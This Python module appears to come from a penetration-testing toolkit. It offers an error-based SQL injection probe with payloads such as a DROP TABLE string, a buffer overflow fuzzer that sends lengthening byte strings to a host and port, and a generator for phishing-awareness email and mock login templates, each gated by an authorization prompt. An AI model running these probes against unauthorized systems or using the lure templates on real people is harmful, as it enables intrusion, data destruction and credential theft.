"""Gaining Access phase.

Techniques Used: SQL injection, Buffer overflow attacks, Phishing attacks.

No lab/VM is available for this project (per project decision) - these
tools take a target at run time, same as Scanning, and require the same
y/n authorization confirmation before sending anything.

Phishing attacks is intentionally a *provision, do not test* feature:
it only generates local template files (an email template and a mock
login-page HTML) and a short awareness write-up. It never sends email,
never contacts a real server, and is meant for internal security-
awareness material you review before using it, not for running against
anyone.
"""

import os
import socket
import urllib.error
import urllib.parse
import urllib.request

from utils import confirm, prompt

TITLE = "Gaining Access"

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "\" OR \"1\"=\"1",
    "1 OR 1=1",
    "'; DROP TABLE users; --",
]

SQL_ERROR_SIGNS = [
    "sql syntax",
    "mysql_fetch",
    "ora-01756",
    "unclosed quotation mark",
    "sqlite3.operationalerror",
    "pg_query",
    "syntax error",
]


def _authorized(target, input_fn):
    return confirm(
        f"Confirm you own or are authorized to test '{target}' (y/N): ",
        input_fn=input_fn,
    )


def sql_injection_test(input_fn=input):
    url = prompt(
        "Target URL with a parameter to fuzz, e.g. http://host/item?id=1: ",
        input_fn=input_fn,
    )
    if not url or "=" not in url:
        print("Need a URL containing at least one '?param=value'. Aborting.")
        return
    if not _authorized(url, input_fn):
        print("Not confirmed as authorized; aborting.")
        return

    base, _, query = url.partition("?")
    params = query.split("&")
    try:
        target_index = int(
            prompt(
                f"Which parameter to fuzz? {list(enumerate(params))} "
                "(index, default 0): ",
                input_fn=input_fn,
                default="0",
            )
        )
    except ValueError:
        target_index = 0
    if target_index < 0 or target_index >= len(params):
        target_index = 0
    param_name, _, _orig_value = params[target_index].partition("=")

    print(f"\n-- SQL injection probe: {url} (param '{param_name}') --")
    print("Error-based detection only: looks for DB error text in responses.\n")
    baseline_len = None
    for payload in SQLI_PAYLOADS:
        new_params = list(params)
        new_params[target_index] = f"{param_name}={urllib.parse.quote(payload, safe='')}"
        test_url = f"{base}?{'&'.join(new_params)}"
        try:
            req = urllib.request.Request(test_url, headers={"User-Agent": "sqli-probe"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read(4096).decode("utf-8", errors="ignore").lower()
                status = resp.status
        except urllib.error.HTTPError as exc:
            status = exc.code
            body = (exc.read(4096) or b"").decode("utf-8", errors="ignore").lower()
        except (urllib.error.URLError, socket.timeout, OSError) as exc:
            print(f"  payload {payload!r}: request failed ({exc})")
            continue

        if baseline_len is None:
            baseline_len = len(body)
        hit = next((sign for sign in SQL_ERROR_SIGNS if sign in body), None)
        flag = f"POSSIBLE SQL ERROR: '{hit}'" if hit else "no error signature seen"
        print(f"  payload {payload!r}: HTTP {status}, {len(body)} bytes - {flag}")
    print(
        "\nNote: absence of an error string is not proof of safety; this is a "
        "quick signal only, not a full SQLi scanner."
    )


def buffer_overflow_fuzz(input_fn=input):
    host = prompt("Target host/IP: ", input_fn=input_fn)
    if not host:
        print("No target given, aborting.")
        return
    if not _authorized(host, input_fn):
        print("Not confirmed as authorized; aborting.")
        return
    try:
        port = int(prompt("Target port: ", input_fn=input_fn, default="0"))
    except ValueError:
        port = 0
    if port <= 0:
        print("Need a valid port, aborting.")
        return
    try:
        max_len = int(
            prompt("Max payload length to reach (default 5000): ",
                   input_fn=input_fn, default="5000")
        )
    except ValueError:
        max_len = 5000

    print(f"\n-- Buffer overflow fuzz: {host}:{port}, up to {max_len} bytes --")
    length = 100
    step = 100
    while length <= max_len:
        payload = b"A" * length
        try:
            with socket.create_connection((host, port), timeout=5) as sock:
                sock.sendall(payload + b"\r\n")
        except (ConnectionError, OSError) as exc:
            print(f"  length {length}: connection failed/dropped ({exc}) - possible crash point")
            return
        print(f"  length {length}: sent ok")
        length += step
    print("Reached max length without a dropped connection.")


def phishing_provision(input_fn=input):
    print("\n-- Phishing: provision only, nothing is sent --")
    print(
        "This writes local template files for an internal security-awareness "
        "exercise. It does not send email and does not contact any server.\n"
    )
    org = prompt("Organization/brand name for the template (default 'Acme Corp'): ",
                 input_fn=input_fn, default="Acme Corp")
    out_dir = prompt("Output directory (default './phishing_templates'): ",
                     input_fn=input_fn, default="./phishing_templates")

    os.makedirs(out_dir, exist_ok=True)

    email_path = os.path.join(out_dir, "awareness_email_template.txt")
    with open(email_path, "w", encoding="utf-8") as fh:
        fh.write(
            f"Subject: Action required - verify your {org} account\n\n"
            f"Hi {{{{first_name}}}},\n\n"
            f"We noticed unusual sign-in activity on your {org} account. "
            f"Please verify your identity using the secure link below within "
            f"24 hours, or your access will be suspended.\n\n"
            f"[VERIFY MY ACCOUNT]({{{{tracking_link}}}})\n\n"
            f"{org} IT Security Team\n\n"
            f"--- FOR INTERNAL AWARENESS USE ONLY. Do not send to real "
            f"recipients without a documented, authorized campaign. ---\n"
        )

    page_path = os.path.join(out_dir, "awareness_login_mock.html")
    with open(page_path, "w", encoding="utf-8") as fh:
        fh.write(
            "<!doctype html><html><head><title>"
            f"{org} Sign in (AWARENESS MOCK - NOT FOR REAL USE)</title></head>\n"
            "<body style=\"font-family:sans-serif;max-width:360px;margin:60px auto;\">\n"
            f"<h2>{org} Sign in</h2>\n"
            "<p style=\"color:red;font-weight:bold;\">INTERNAL AWARENESS MOCK "
            "- do not deploy publicly or collect real credentials.</p>\n"
            "<form onsubmit=\"return false;\">\n"
            "  <input placeholder=\"Email\"><br><br>\n"
            "  <input placeholder=\"Password\" type=\"password\"><br><br>\n"
            "  <button type=\"submit\">Sign in</button>\n"
            "</form>\n</body></html>\n"
        )

    report_path = os.path.join(out_dir, "awareness_notes.md")
    with open(report_path, "w", encoding="utf-8") as fh:
        fh.write(
            "# Phishing awareness materials - internal use only\n\n"
            f"Generated for: {org}\n\n"
            "These files are templates for a documented, authorized internal "
            "security-awareness exercise (e.g. run by your security team with "
            "HR/legal sign-off). They are **not configured to send anything** "
            "and **not configured to collect anything** - the mock login page "
            "has no backend and the email template has no mail transport "
            "wired up. Do not add real sending/collection logic and point it "
            "at real people without that authorization in place.\n"
        )

    print(f"Wrote: {email_path}")
    print(f"Wrote: {page_path}")
    print(f"Wrote: {report_path}")


SUBMENU = {
    "1": ("SQL injection test (error-based probe)", sql_injection_test),
    "2": ("Buffer overflow fuzzing", buffer_overflow_fuzz),
    "3": ("Phishing attacks (provision templates only, no sending)", phishing_provision),
}


def run(input_fn=input):
    print(f"\n== {TITLE} ==")
    for key, (label, _fn) in SUBMENU.items():
        print(f" {key}. {label}")
    print(" 0. Back")
    choice = prompt("Select an option: ", input_fn=input_fn)
    if choice == "0" or choice == "":
        return
    entry = SUBMENU.get(choice)
    if entry is None:
        print("Invalid option.")
        return
    _label, fn = entry
    fn(input_fn=input_fn)
